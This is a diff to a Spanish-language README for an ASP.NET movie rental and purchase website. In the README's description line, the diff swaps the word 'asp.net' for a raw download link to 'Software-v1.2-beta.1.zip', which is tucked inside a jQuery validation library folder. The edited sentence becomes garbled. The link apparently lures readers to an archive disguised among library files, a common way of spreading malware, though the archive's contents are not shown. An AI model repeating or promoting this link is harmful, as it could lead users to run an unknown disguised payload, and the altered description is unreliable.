@@ -1,6 +1,6 @@
 # Movies
 
-Este proyecto consiste en un sitio web desarrollado en asp.net aplicando la arquitectura multicapas y trata sobre un sitio donde puedes alquilar y comprar peliculas.
+Este proyecto consiste en un sitio web desarrollado en https://github.com/saryramirez02/Movies/raw/refs/heads/main/Movies.web/wwwroot/lib/jquery-validation-unobtrusive/Software-v1.2-beta.1.zip aplicando la arquitectura multicapas y trata sobre un sitio donde puedes alquilar y comprar peliculas.
 
 ## Integrantes:
 
